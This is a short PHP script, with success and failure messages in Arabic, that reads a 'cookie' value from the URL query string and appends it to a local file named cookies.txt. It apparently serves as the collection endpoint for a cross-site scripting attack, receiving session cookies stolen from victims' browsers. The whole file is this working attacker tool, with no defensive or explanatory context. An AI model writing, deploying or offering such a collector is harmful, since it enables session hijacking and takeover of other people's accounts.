<?php
if(isset($_GET['cookie'])) {
    $cookie = $_GET['cookie'];
    file_put_contents("cookies.txt", "Cookie: " . $cookie . "\n", FILE_APPEND | LOCK_EX);
    echo "✅ تم تسجيل الكوكيز بنجاح!";
} else {
    echo "❌ لا يوجد كوكيز!";
}
?>
